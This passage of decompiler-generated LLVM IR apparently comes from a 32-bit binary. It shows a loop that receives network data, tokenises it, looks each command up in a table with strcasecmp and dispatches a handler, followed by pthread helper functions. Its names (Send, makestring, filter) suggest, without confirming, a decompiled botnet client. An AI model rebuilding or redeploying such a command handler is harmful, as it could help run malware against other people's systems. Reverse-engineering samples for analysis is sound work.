  %v4_804b0c8 = call i32 @recv(i32 %storemerge8.lcssa, i32 %v6_804af1b, i32 %v2_804af14, i32 %stack_var_-36.3.lcssa)
  store i32 %v4_804b0c8, i32* %eax.global-to-local, align 4
  %tmp111 = icmp slt i32 %v4_804b0c8, 1
  br i1 %tmp111, label %dec_label_pc_804aed8, label %dec_label_pc_804b0dd

dec_label_pc_804b0dd:                             ; preds = %dec_label_pc_804b0b4
  %v0_804b0e0 = load i32, i32* @ebp, align 4
  %v2_804b0e0 = add i32 %v4_804b0c8, -6592
  %v3_804b0e0 = add i32 %v2_804b0e0, %v0_804b0e0
  %v4_804b0e0 = inttoptr i32 %v3_804b0e0 to i8*
  store i8 0, i8* %v4_804b0e0, align 1
  %v0_804b0e8 = load i32, i32* @esp, align 4
  %v1_804b0eb = add i32 %v0_804b0e8, -12
  %v2_804b0eb = inttoptr i32 %v1_804b0eb to i32*
  store i32 ptrtoint (i32* @global_var_805b195.129 to i32), i32* %v2_804b0eb, align 4
  store i32 %v2_804b0c0, i32* @eax, align 4
  %v2_804b0f6 = add i32 %v0_804b0e8, -16
  %v3_804b0f6 = inttoptr i32 %v2_804b0f6 to i32*
  store i32 %v2_804b0c0, i32* %v3_804b0f6, align 4
  %v1_804b0f7 = call i32 @__GI_strtok(i32 %v4_804b0c8)
  store i32 %v1_804b0f7, i32* %eax.global-to-local, align 4
  %v0_804b0fc = load i32, i32* @esp, align 4
  %v5_804b0ff = inttoptr i32 %v1_804b0f7 to i8*
  store i8* %v5_804b0ff, i8** %stack_var_-28, align 4
  %v5_804b29e24 = icmp eq i32 %v1_804b0f7, 0
  br i1 %v5_804b29e24, label %dec_label_pc_804af0a.outer, label %dec_label_pc_804b2a8

dec_label_pc_804b107:                             ; preds = %dec_label_pc_804b2a8
  %v6_804b107 = add i32 %v5_804b107.in, 12
  %v7_804b107 = inttoptr i32 %v6_804b107 to i32*
  store i32 %v4_804b2a8, i32* %v7_804b107, align 4
  %v0_804b10a = load i8*, i8** %stack_var_-28, align 4
  %v3_804b10a = call i32 @filter(i8* %v0_804b10a)
  %v4_804b112 = ptrtoint i8* %v0_804b10a to i32
  store i32 %v4_804b112, i32* %eax.global-to-local, align 4
  %v2_804b115 = load i8, i8* %v0_804b10a, align 1
  %v3_804b115 = zext i8 %v2_804b115 to i32
  %v5_804b115 = and i32 %v4_804b112, -256
  %v6_804b115 = or i32 %v3_804b115, %v5_804b115
  store i32 %v6_804b115, i32* %eax.global-to-local, align 4
  %v10_804b117 = icmp eq i8 %v2_804b115, 58
  %v1_804b119 = icmp eq i1 %v10_804b117, false
  br i1 %v1_804b119, label %dec_label_pc_804b190, label %dec_label_pc_804b127

dec_label_pc_804b124:                             ; preds = %dec_label_pc_804b14c
  %v4_804b124 = add i32 %storemerge7, 1
  br label %dec_label_pc_804b127

dec_label_pc_804b127:                             ; preds = %dec_label_pc_804b107, %dec_label_pc_804b124
  %storemerge7 = phi i32 [ %v4_804b124, %dec_label_pc_804b124 ], [ 0, %dec_label_pc_804b107 ]
  store i32 %storemerge7, i32* %edx.global-to-local, align 4
  store i32 -1, i32* %ecx.global-to-local, align 4
  store i32 %v5_804b115, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  %v3_804b141 = call i32 @_strlen(i8* %v0_804b10a)
  %v4_804b141 = mul i32 %v3_804b141, -1
  %v5_804b141 = add i32 %v4_804b141, -2
  store i32 %v5_804b141, i32* %ecx.global-to-local, align 4
  %v1_804b147 = sub i32 0, %v4_804b141
  store i32 %v1_804b147, i32* %eax.global-to-local, align 4
  %v0_804b148 = load i32, i32* %edx.global-to-local, align 4
  %v7_804b148 = icmp ult i32 %v0_804b148, %v1_804b147
  %v1_804b14a = icmp eq i1 %v7_804b148, false
  %.pre67 = add i32 %storemerge7, %v4_804b112
  br i1 %v1_804b14a, label %dec_label_pc_804b127.dec_label_pc_804b158_crit_edge, label %dec_label_pc_804b14c

dec_label_pc_804b127.dec_label_pc_804b158_crit_edge: ; preds = %dec_label_pc_804b127
  %.pre74 = inttoptr i32 %.pre67 to i8*
  br label %dec_label_pc_804b158

dec_label_pc_804b14c:                             ; preds = %dec_label_pc_804b127
  store i32 %.pre67, i32* %eax.global-to-local, align 4
  %v1_804b152 = inttoptr i32 %.pre67 to i8*
  %v2_804b152 = load i8, i8* %v1_804b152, align 1
  %v3_804b152 = zext i8 %v2_804b152 to i32
  %v5_804b152 = and i32 %.pre67, -256
  %v6_804b152 = or i32 %v3_804b152, %v5_804b152
  store i32 %v6_804b152, i32* %eax.global-to-local, align 4
  %v7_804b154 = icmp eq i8 %v2_804b152, 32
  %v1_804b156 = icmp eq i1 %v7_804b154, false
  br i1 %v1_804b156, label %dec_label_pc_804b124, label %dec_label_pc_804b158

dec_label_pc_804b158:                             ; preds = %dec_label_pc_804b14c, %dec_label_pc_804b127.dec_label_pc_804b158_crit_edge
  %v1_804b15e.pre-phi = phi i8* [ %.pre74, %dec_label_pc_804b127.dec_label_pc_804b158_crit_edge ], [ %v1_804b152, %dec_label_pc_804b14c ]
  store i8 0, i8* %v1_804b15e.pre-phi, align 1
  %v3_804b161 = load i8*, i8** %stack_var_-28, align 4
  %v4_804b161 = ptrtoint i8* %v3_804b161 to i32
  %v1_804b164 = add i32 %v4_804b161, 1
  %v0_804b165 = load i32, i32* @esp, align 4
  %v2_804b168 = add i32 %v0_804b165, -12
  %v3_804b168 = inttoptr i32 %v2_804b168 to i32*
  store i32 %v1_804b164, i32* %v3_804b168, align 4
  store i32 %v2_804b190, i32* @eax, align 4
  %v2_804b16f = add i32 %v0_804b165, -16
  %v3_804b16f = inttoptr i32 %v2_804b16f to i32*
  store i32 %v2_804b190, i32* %v3_804b16f, align 4
  %v4_804b170 = call i32 @strcpy(i8* %v0_804b10a, i32 %stack_var_-6624.0.lcssa)
  %v0_804b175 = load i32, i32* @esp, align 4
  %v4_804b17b = load i8*, i8** %stack_var_-28, align 4
  %v5_804b17b = ptrtoint i8* %v4_804b17b to i32
  %v6_804b17b = add i32 %storemerge7, 1
  %v1_804b17e = add i32 %v6_804b17b, %v5_804b17b
  store i32 %v1_804b17e, i32* @eax, align 4
  %v2_804b182 = add i32 %v0_804b175, 4
  %v3_804b182 = inttoptr i32 %v2_804b182 to i32*
  store i32 %v1_804b17e, i32* %v3_804b182, align 4
  %v3_804b183 = load i8*, i8** %stack_var_-28, align 4
  %v4_804b183 = ptrtoint i8* %v3_804b183 to i32
  %v7_804b183 = inttoptr i32 %v0_804b175 to i32*
  store i32 %v4_804b183, i32* %v7_804b183, align 4
  %v4_804b186 = call i32 @strcpy(i8* %v0_804b10a, i32 %stack_var_-6624.0.lcssa)
  store i32 %v4_804b186, i32* %eax.global-to-local, align 4
  %v3_804b1aa.pre.pre = load i8*, i8** %stack_var_-28, align 4
  br label %dec_label_pc_804b1a7.preheader

dec_label_pc_804b190:                             ; preds = %dec_label_pc_804b107
  store i32 %v2_804b190, i32* %eax.global-to-local, align 4
  store i32 42, i32* %stack_var_-2504, align 4
  br label %dec_label_pc_804b1a7.preheader

dec_label_pc_804b1a7.preheader:                   ; preds = %dec_label_pc_804b158, %dec_label_pc_804b190
  %v3_804b1aa.pre = phi i8* [ %v3_804b1aa.pre.pre, %dec_label_pc_804b158 ], [ %v0_804b10a, %dec_label_pc_804b190 ]
  %stack_var_-6628.2.ph = phi i8* [ %v0_804b10a, %dec_label_pc_804b158 ], [ %stack_var_-6628.331, %dec_label_pc_804b190 ]
  %v4_804b1aa = ptrtoint i8* %v3_804b1aa.pre to i32
  %v1_804b1b8 = and i32 %v4_804b1aa, -256
  br label %dec_label_pc_804b1a7

dec_label_pc_804b1a4:                             ; preds = %dec_label_pc_804b1cc
  %v4_804b1a4 = add i32 %storemerge6, 1
  br label %dec_label_pc_804b1a7

dec_label_pc_804b1a7:                             ; preds = %dec_label_pc_804b1a7.preheader, %dec_label_pc_804b1a4
  %storemerge6 = phi i32 [ %v4_804b1a4, %dec_label_pc_804b1a4 ], [ 0, %dec_label_pc_804b1a7.preheader ]
  store i32 %storemerge6, i32* %edx.global-to-local, align 4
  store i32 -1, i32* %ecx.global-to-local, align 4
  store i32 %v1_804b1b8, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804b1aa, i32* @edi, align 4
  %v3_804b1c1 = call i32 @_strlen(i8* %v3_804b1aa.pre)
  %v4_804b1c1 = mul i32 %v3_804b1c1, -1
  %v5_804b1c1 = add i32 %v4_804b1c1, -2
  store i32 %v5_804b1c1, i32* %ecx.global-to-local, align 4
  %v1_804b1c7 = sub i32 0, %v4_804b1c1
  store i32 %v1_804b1c7, i32* %eax.global-to-local, align 4
  %v0_804b1c8 = load i32, i32* %edx.global-to-local, align 4
  %v7_804b1c8 = icmp ult i32 %v0_804b1c8, %v1_804b1c7
  %v1_804b1ca = icmp eq i1 %v7_804b1c8, false
  %.pre59 = add i32 %storemerge6, %v4_804b1aa
  br i1 %v1_804b1ca, label %dec_label_pc_804b1a7.dec_label_pc_804b1d8_crit_edge, label %dec_label_pc_804b1cc

dec_label_pc_804b1a7.dec_label_pc_804b1d8_crit_edge: ; preds = %dec_label_pc_804b1a7
  %.pre66 = inttoptr i32 %.pre59 to i8*
  br label %dec_label_pc_804b1d8

dec_label_pc_804b1cc:                             ; preds = %dec_label_pc_804b1a7
  store i32 %.pre59, i32* %eax.global-to-local, align 4
  %v1_804b1d2 = inttoptr i32 %.pre59 to i8*
  %v2_804b1d2 = load i8, i8* %v1_804b1d2, align 1
  %v3_804b1d2 = zext i8 %v2_804b1d2 to i32
  %v5_804b1d2 = and i32 %.pre59, -256
  %v6_804b1d2 = or i32 %v3_804b1d2, %v5_804b1d2
  store i32 %v6_804b1d2, i32* %eax.global-to-local, align 4
  %v7_804b1d4 = icmp eq i8 %v2_804b1d2, 32
  %v1_804b1d6 = icmp eq i1 %v7_804b1d4, false
  br i1 %v1_804b1d6, label %dec_label_pc_804b1a4, label %dec_label_pc_804b1d8

dec_label_pc_804b1d8:                             ; preds = %dec_label_pc_804b1cc, %dec_label_pc_804b1a7.dec_label_pc_804b1d8_crit_edge
  %v1_804b1de.pre-phi = phi i8* [ %.pre66, %dec_label_pc_804b1a7.dec_label_pc_804b1d8_crit_edge ], [ %v1_804b1d2, %dec_label_pc_804b1cc ]
  store i8 0, i8* %v1_804b1de.pre-phi, align 1
  %v0_804b1e1 = load i32, i32* @esp, align 4
  %v3_804b1e4 = load i8*, i8** %stack_var_-28, align 4
  %v4_804b1e4 = ptrtoint i8* %v3_804b1e4 to i32
  %v6_804b1e4 = add i32 %v0_804b1e1, -12
  %v7_804b1e4 = inttoptr i32 %v6_804b1e4 to i32*
  store i32 %v4_804b1e4, i32* %v7_804b1e4, align 4
  store i32 %v2_804b1e7, i32* @eax, align 4
  %v2_804b1ed = add i32 %v0_804b1e1, -16
  %v3_804b1ed = inttoptr i32 %v2_804b1ed to i32*
  store i32 %v2_804b1e7, i32* %v3_804b1ed, align 4
  %v3_804b1ee = ptrtoint i8* %stack_var_-6628.2.ph to i32
  %v5_804b1ee = call i32 @strcpy(i8* %v3_804b1aa.pre, i32 %v3_804b1ee)
  %v0_804b1f3 = load i32, i32* @esp, align 4
  %v4_804b1f9 = load i8*, i8** %stack_var_-28, align 4
  %v5_804b1f9 = ptrtoint i8* %v4_804b1f9 to i32
  %v6_804b1f9 = add i32 %storemerge6, 1
  %v1_804b1fc = add i32 %v6_804b1f9, %v5_804b1f9
  store i32 %v1_804b1fc, i32* @eax, align 4
  %v2_804b200 = add i32 %v0_804b1f3, 4
  %v3_804b200 = inttoptr i32 %v2_804b200 to i32*
  store i32 %v1_804b1fc, i32* %v3_804b200, align 4
  %v3_804b201 = load i8*, i8** %stack_var_-28, align 4
  %v4_804b201 = ptrtoint i8* %v3_804b201 to i32
  %v7_804b201 = inttoptr i32 %v0_804b1f3 to i32*
  store i32 %v4_804b201, i32* %v7_804b201, align 4
  %v5_804b204 = call i32 @strcpy(i8* %v3_804b1aa.pre, i32 %v3_804b1ee)
  %v0_804b209 = load i32, i32* @esp, align 4
  %v1_804b209 = add i32 %v0_804b209, 16
  %v4_804b25f157 = load i32, i32* bitcast ([4 x i8]** @global_var_805e2c0.131 to i32*), align 8
  store i32 %v4_804b25f157, i32* %eax.global-to-local, align 4
  %v1_804b266158 = icmp eq i32 %v4_804b25f157, 0
  %v1_804b268159 = icmp eq i1 %v1_804b266158, false
  br i1 %v1_804b268159, label %dec_label_pc_804b215, label %dec_label_pc_804b26a

dec_label_pc_804b215:                             ; preds = %dec_label_pc_804b1d8, %dec_label_pc_804b215
  %v3_804b25f163 = phi i32* [ %v3_804b25f, %dec_label_pc_804b215 ], [ bitcast ([4 x i8]** @global_var_805e2c0.131 to i32*), %dec_label_pc_804b1d8 ]
  %v1_804b25f162 = phi i32 [ %v1_804b25f, %dec_label_pc_804b215 ], [ 0, %dec_label_pc_804b1d8 ]
  %storemerge161 = phi i32 [ %v4_804b259, %dec_label_pc_804b215 ], [ 0, %dec_label_pc_804b1d8 ]
  %v0_804b21f160 = phi i32 [ %v1_804b256, %dec_label_pc_804b215 ], [ %v1_804b209, %dec_label_pc_804b1d8 ]
  store i32 %storemerge161, i32* %eax.global-to-local, align 4
  %v4_804b218 = load i32, i32* %v3_804b25f163, align 8
  store i32 %v4_804b218, i32* %edx.global-to-local, align 4
  store i32 %v2_804b1e7, i32* %eax.global-to-local, align 4
  %v2_804b228 = add i32 %v0_804b21f160, -12
  %v3_804b228 = inttoptr i32 %v2_804b228 to i32*
  store i32 %v2_804b1e7, i32* %v3_804b228, align 4
  %v0_804b229 = load i32, i32* %edx.global-to-local, align 4
  %v2_804b229 = add i32 %v0_804b21f160, -16
  %v3_804b229 = inttoptr i32 %v2_804b229 to i32*
  store i32 %v0_804b229, i32* %v3_804b229, align 4
  %v1_804b22a = load i32, i32* %stack_var_-20, align 4
  %v2_804b22a = inttoptr i32 %storemerge161 to i8*
  %v3_804b22a = call i32 @__GI_strcasecmp(i8* %v2_804b22a, i32 %v1_804b22a)
  %v0_804b22f = load i32, i32* @esp, align 4
  store i32 %storemerge161, i32* %eax.global-to-local, align 4
  %v2_804b239 = add i32 %v1_804b25f162, ptrtoint (i32* @global_var_805e2c4.132 to i32)
  %v3_804b239 = inttoptr i32 %v2_804b239 to i32*
  %v4_804b239 = load i32, i32* %v3_804b239, align 4
  store i32 %v4_804b239, i32* %ecx.global-to-local, align 4
  %v0_804b240 = load i32, i32* @global_var_8067528.28, align 8
  store i32 %v0_804b240, i32* @edx, align 4
  %v3_804b249 = load i8*, i8** %stack_var_-28, align 4
  %v4_804b249 = ptrtoint i8* %v3_804b249 to i32
  %v6_804b249 = add i32 %v0_804b22f, 8
  %v7_804b249 = inttoptr i32 %v6_804b249 to i32*
  store i32 %v4_804b249, i32* %v7_804b249, align 4
  store i32 %v2_804b190, i32* %eax.global-to-local, align 4
  %v2_804b252 = add i32 %v0_804b22f, 4
  %v3_804b252 = inttoptr i32 %v2_804b252 to i32*
  store i32 %v2_804b190, i32* %v3_804b252, align 4
  %v0_804b253 = load i32, i32* @edx, align 4
  %v3_804b253 = inttoptr i32 %v0_804b22f to i32*
  store i32 %v0_804b253, i32* %v3_804b253, align 4
  %v1_804b254 = add i32 %v0_804b22f, -4
  %v2_804b254 = inttoptr i32 %v1_804b254 to i32*
  store i32 134525526, i32* %v2_804b254, align 4
  call void @__pseudo_call(i32 %v4_804b239)
  %v0_804b256 = load i32, i32* @esp, align 4
  %v1_804b256 = add i32 %v0_804b256, 16
  %v4_804b259 = add i32 %storemerge161, 1
  store i32 %v4_804b259, i32* %eax.global-to-local, align 4
  %v1_804b25f = mul i32 %v4_804b259, 8
  %v2_804b25f = add i32 %v1_804b25f, ptrtoint ([4 x i8]** @global_var_805e2c0.131 to i32)
  %v3_804b25f = inttoptr i32 %v2_804b25f to i32*
  %v4_804b25f = load i32, i32* %v3_804b25f, align 8
  store i32 %v4_804b25f, i32* %eax.global-to-local, align 4
  %v1_804b266 = icmp eq i32 %v4_804b25f, 0
  %v1_804b268 = icmp eq i1 %v1_804b266, false
  br i1 %v1_804b268, label %dec_label_pc_804b215, label %dec_label_pc_804b26a

dec_label_pc_804b26a:                             ; preds = %dec_label_pc_804b215, %dec_label_pc_804b1d8
  %v0_804b21f.lcssa = phi i32 [ %v1_804b209, %dec_label_pc_804b1d8 ], [ %v1_804b256, %dec_label_pc_804b215 ]
  %storemerge.lcssa = phi i32 [ 0, %dec_label_pc_804b1d8 ], [ %v4_804b259, %dec_label_pc_804b215 ]
  %v1_804b26d = add i32 %v0_804b21f.lcssa, -12
  %v2_804b26d = inttoptr i32 %v1_804b26d to i32*
  store i32 ptrtoint ([6 x i8]* @global_var_805b197.133 to i32), i32* %v2_804b26d, align 4
  store i32 %v2_804b1e7, i32* %eax.global-to-local, align 4
  %v2_804b278 = add i32 %v0_804b21f.lcssa, -16
  %v3_804b278 = inttoptr i32 %v2_804b278 to i32*
  store i32 %v2_804b1e7, i32* %v3_804b278, align 4
  %v1_804b279 = load i32, i32* %stack_var_-20, align 4
  %v2_804b279 = inttoptr i32 %storemerge.lcssa to i8*
  %v3_804b279 = call i32 @__GI_strcasecmp(i8* %v2_804b279, i32 %v1_804b279)
  store i32 %v3_804b279, i32* @eax, align 4
  %v0_804b27e = load i32, i32* @esp, align 4
  %v1_804b281 = icmp eq i32 %v3_804b279, 0
  br i1 %v1_804b281, label %dec_label_pc_804aed8, label %dec_label_pc_804b289

dec_label_pc_804b289:                             ; preds = %dec_label_pc_804b26a
  %v1_804b28c = add i32 %v0_804b27e, 4
  %v2_804b28c = inttoptr i32 %v1_804b28c to i32*
  store i32 ptrtoint (i32* @global_var_805b195.129 to i32), i32* %v2_804b28c, align 4
  %v2_804b291 = inttoptr i32 %v0_804b27e to i32*
  store i32 0, i32* %v2_804b291, align 4
  %v1_804b293 = call i32 @__GI_strtok(i32 %storemerge.lcssa)
  store i32 %v1_804b293, i32* %eax.global-to-local, align 4
  %v0_804b298 = load i32, i32* @esp, align 4
  store i32 %v1_804b293, i32* %tmp108, align 4
  %v5_804b29e = icmp eq i32 %v1_804b293, 0
  %tmp112 = inttoptr i32 %v1_804b293 to i8*
  br i1 %v5_804b29e, label %dec_label_pc_804af0a.outer.outer, label %dec_label_pc_804b2a8

dec_label_pc_804b2a8:                             ; preds = %dec_label_pc_804b0dd, %dec_label_pc_804b289
  %v5_804b107.in = phi i32 [ %v0_804b298, %dec_label_pc_804b289 ], [ %v0_804b0fc, %dec_label_pc_804b0dd ]
  %v3_804b107 = phi i8* [ %tmp112, %dec_label_pc_804b289 ], [ %v5_804b0ff, %dec_label_pc_804b0dd ]
  %stack_var_-6628.331 = phi i8* [ %stack_var_-6628.2.ph, %dec_label_pc_804b289 ], [ %stack_var_-6628.1.ph.ph115, %dec_label_pc_804b0dd ]
  %v4_804b2a8 = ptrtoint i8* %v3_804b107 to i32
  store i32 %v4_804b2a8, i32* %eax.global-to-local, align 4
  %v2_804b2ab = load i8, i8* %v3_804b107, align 1
  %v3_804b2ab = zext i8 %v2_804b2ab to i32
  %v5_804b2ab = and i32 %v4_804b2a8, -256
  %v6_804b2ab = or i32 %v3_804b2ab, %v5_804b2ab
  store i32 %v6_804b2ab, i32* %eax.global-to-local, align 4
  %v4_804b2ad = icmp eq i8 %v2_804b2ab, 0
  %v1_804b2af = icmp eq i1 %v4_804b2ad, false
  br i1 %v1_804b2af, label %dec_label_pc_804b107, label %dec_label_pc_804af0a.outer.outer

; uselistorder directives
  uselistorder i32 %v4_804b2a8, { 1, 2, 0 }
  uselistorder i32 %v1_804b293, { 2, 1, 0, 3 }
  uselistorder i32 %v0_804b27e, { 1, 0 }
  uselistorder i32 %storemerge.lcssa, { 1, 0 }
  uselistorder i32* %v3_804b25f, { 1, 0 }
  uselistorder i32 %v1_804b25f, { 1, 0 }
  uselistorder i32 %v4_804b259, { 0, 2, 3, 1 }
  uselistorder i32 %v0_804b22f, { 0, 3, 1, 2 }
  uselistorder i32 %storemerge161, { 3, 2, 1, 0 }
  uselistorder i32 %v0_804b1f3, { 1, 0 }
  uselistorder i32 %.pre59, { 3, 2, 1, 0 }
  uselistorder i32 %v1_804b1c7, { 1, 0 }
  uselistorder i32 %storemerge6, { 0, 1, 3, 2 }
  uselistorder i8* %stack_var_-6628.2.ph, { 2, 3, 1, 0 }
  uselistorder i8* %v3_804b1aa.pre, { 3, 2, 0, 1 }
  uselistorder i32 %v0_804b175, { 1, 0 }
  uselistorder i32 %.pre67, { 3, 2, 1, 0 }
  uselistorder i32 %v1_804b147, { 1, 0 }
  uselistorder i32 %storemerge7, { 0, 1, 3, 2 }
  uselistorder i32 %v5_804b115, { 1, 0 }
  uselistorder i8* %v0_804b10a, { 4, 0, 3, 2, 1, 6, 5, 7 }
  uselistorder i32 %v4_804b0c8, { 2, 1, 0, 3 }
  uselistorder i32 %v2_804b09e, { 2, 1, 0 }
  uselistorder i32 %v1_804b096, { 1, 0 }
  uselistorder i32 %v0_804b08f, { 2, 0, 1 }
  uselistorder i32 %stack_var_-36.3.lcssa, { 4, 3, 2, 1, 0, 5, 6 }
  uselistorder i32 %v0_804b0b945, { 1, 0 }
  uselistorder i32 %v4_804b058, { 1, 2, 0 }
  uselistorder i32 %v2_804b03c, { 2, 0, 1 }
  uselistorder i32 %storemerge9141, { 1, 0 }
  uselistorder i32 %v1_804b025, { 1, 3, 2, 0 }
  uselistorder i32 %v2_804afcb, { 1, 2, 0 }
  uselistorder i32 %v2_804afc1, { 1, 0, 2 }
  uselistorder i32 %v4_804afe5, { 1, 0, 3, 2 }
  uselistorder i32 %v1_804afce137, { 1, 0 }
  uselistorder i32 %v2_804afc1130, { 2, 1, 0 }
  uselistorder i32 %.pre53, { 1, 5, 2, 3, 0, 6, 4 }
  uselistorder i32 %v2_804af8e, { 1, 0 }
  uselistorder i32 %stack_var_-36.3152, { 1, 0 }
  uselistorder i32 %storemerge8153, { 2, 1, 0 }
  uselistorder i32 %v1_804af32, { 1, 0 }
  uselistorder i32 %v2_804af2a, { 1, 0 }
  uselistorder i32 %v0_804af23, { 1, 0 }
  uselistorder i8* %stack_var_-6628.1.ph.ph115, { 0, 2, 1 }
  uselistorder i32 %v2_804b190, { 3, 2, 4, 1, 0 }
  uselistorder i32 %v2_804ae8b, { 1, 0, 2 }
  uselistorder i32 %stack_var_-6624.0.lcssa, { 1, 0 }
  uselistorder i32 %v4_804ae60, { 2, 1, 0 }
  uselistorder i32 %v2_804ae4f, { 1, 0, 2 }
  uselistorder i32 %v3_804ae37, { 1, 0 }
  uselistorder i32 %v2_804ae15, { 3, 1, 2, 0 }
  uselistorder i32 %storemerge11175, { 1, 0 }
  uselistorder i32 %v2_804adf5, { 1, 0, 2 }
  uselistorder i32 %v2_804ad95, { 2, 1, 0, 3, 5, 4, 6, 7, 8 }
  uselistorder i32* %stack_var_4, { 1, 0, 2 }
  uselistorder i32* %stack_var_-20, { 1, 0, 2 }
  uselistorder i32* %stack_var_-6672, { 1, 2, 0, 3, 4, 5 }
  uselistorder i8** %stack_var_-28, { 9, 8, 7, 6, 0, 5, 4, 3, 10, 2, 1 }
  uselistorder i32* %edx.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 12, 20, 14, 15, 16, 17, 18, 19, 0, 1, 2 }
  uselistorder i32* %ecx.global-to-local, { 4, 5, 6, 7, 8, 9, 10, 11, 12, 0, 1, 2, 3 }
  uselistorder i32* %eax.global-to-local, { 35, 36, 15, 16, 21, 22, 17, 18, 19, 20, 71, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 37, 38, 41, 42, 39, 40, 54, 43, 44, 46, 45, 69, 47, 49, 48, 68, 50, 51, 52, 53, 70, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 7, 1, 2, 3, 4, 5, 6, 0, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder [4 x i8]** @global_var_805e2c0.131, { 1, 0 }
  uselistorder i32 (i8*)* @filter, { 1, 0 }
  uselistorder i32 (i32)* @__GI_strtok, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @recv, { 2, 5, 1, 4, 0, 3 }
  uselistorder i32* @global_var_806764c.31, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10 }
  uselistorder i32* @global_var_8062a90.30, { 5, 6, 1, 7, 8, 9, 2, 0, 10, 3, 11, 4, 12, 13 }
  uselistorder i32 (i32, i32)* @Send, { 0, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17 }
  uselistorder i32 ()* @makestring, { 2, 1, 0, 3 }
  uselistorder i32 (i32*)* @__GI_time, { 11, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder [6 x i8]* @global_var_805b152.124, { 1, 0 }
  uselistorder label %dec_label_pc_804b2a8, { 1, 0 }
  uselistorder label %dec_label_pc_804b215, { 1, 0 }
  uselistorder label %dec_label_pc_804b1a7, { 1, 0 }
  uselistorder label %dec_label_pc_804b1a7.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804b127, { 1, 0 }
  uselistorder label %dec_label_pc_804b08f, { 1, 0 }
  uselistorder label %dec_label_pc_804b07e, { 1, 0 }
  uselistorder label %dec_label_pc_804b065, { 1, 0 }
  uselistorder label %dec_label_pc_804b039, { 1, 0 }
  uselistorder label %dec_label_pc_804afbe, { 1, 0 }
  uselistorder label %dec_label_pc_804af8b, { 1, 0 }
  uselistorder label %dec_label_pc_804af0a, { 1, 0 }
  uselistorder label %dec_label_pc_804af0a.outer, { 1, 0 }
  uselistorder label %dec_label_pc_804af0a.outer.outer, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804aed8, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_804ae12, { 1, 0 }
  uselistorder label %dec_label_pc_804adc4, { 1, 0 }
}

define i32 @thread_self() local_unnamed_addr {
entry:
  %stack_var_2096672 = alloca i32, align 4
  %stack_var_2097151 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_804b2bc = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_804b2bc, i32* @edx, align 4
  %v0_804b2c3 = load i32, i32* @esp, align 4
  %v1_804b2c3 = load i32, i32* @global_var_8062fec.134, align 4
  %v7_804b2c3 = icmp ult i32 %v0_804b2c3, %v1_804b2c3
  %v1_804b2c9 = icmp eq i1 %v7_804b2c3, false
  br i1 %v1_804b2c9, label %dec_label_pc_804b2fa, label %dec_label_pc_804b2cb

dec_label_pc_804b2cb:                             ; preds = %entry
  %v1_804b2cb = load i32, i32* @global_var_8062ff0.135, align 16
  %v7_804b2cb = icmp ult i32 %v0_804b2c3, %v1_804b2cb
  br i1 %v7_804b2cb, label %dec_label_pc_804b2e0, label %dec_label_pc_804b2d3

dec_label_pc_804b2d3:                             ; preds = %dec_label_pc_804b2cb
  %v1_804b2d8 = load i32, i32* @global_var_8062ff4.137, align 4
  %v7_804b2d8 = icmp ult i32 %v0_804b2c3, %v1_804b2d8
  br i1 %v7_804b2d8, label %dec_label_pc_804b2fa, label %dec_label_pc_804b2e0

dec_label_pc_804b2e0:                             ; preds = %dec_label_pc_804b2d3, %dec_label_pc_804b2cb
  %v0_804b2e0 = load i32, i32* @global_var_8067650.138, align 16
  %v1_804b2e0 = icmp eq i32 %v0_804b2e0, 0
  br i1 %v1_804b2e0, label %dec_label_pc_804b2ee, label %dec_label_pc_804b2e9

dec_label_pc_804b2e9:                             ; preds = %dec_label_pc_804b2e0
  %v0_804b2e9 = call i32 @__pthread_find_self()
  br label %dec_label_pc_804b2ee

dec_label_pc_804b2ee:                             ; preds = %dec_label_pc_804b2e0, %dec_label_pc_804b2e9
  %v3_804b2ee = ptrtoint i32* %stack_var_2097151 to i32
  store i32 %v3_804b2ee, i32* @edx, align 4
  %v2_804b2f4 = ptrtoint i32* %stack_var_2096672 to i32
  br label %dec_label_pc_804b2fa

dec_label_pc_804b2fa:                             ; preds = %dec_label_pc_804b2d3, %entry, %dec_label_pc_804b2ee
  %v0_804b2fa = phi i32 [ ptrtoint (i32* @global_var_8062500.136 to i32), %dec_label_pc_804b2d3 ], [ 134619936, %entry ], [ %v2_804b2f4, %dec_label_pc_804b2ee ]
  ret i32 %v0_804b2fa

; uselistorder directives
  uselistorder label %dec_label_pc_804b2fa, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804b2ee, { 1, 0 }
}

define i32 @__h_errno_location() local_unnamed_addr {
entry:
  %v0_804b2fe = call i32 @thread_self()
  %v1_804b303 = add i32 %v0_804b2fe, 76
  %v2_804b303 = inttoptr i32 %v1_804b303 to i32*
  %v3_804b303 = load i32, i32* %v2_804b303, align 4
  ret i32 %v3_804b303
}

define i32 @__errno_location(i32 %arg1) local_unnamed_addr {
entry:
  %v0_804b30d = call i32 @thread_self()
  %v1_804b312 = add i32 %v0_804b30d, 68
  %v2_804b312 = inttoptr i32 %v1_804b312 to i32*
  %v3_804b312 = load i32, i32* %v2_804b312, align 4
  ret i32 %v3_804b312
}

define i32 @__pthread_manager_adjust_prio(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_804b31c = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804b324 = load i32, i32* @global_var_8062518.139, align 8
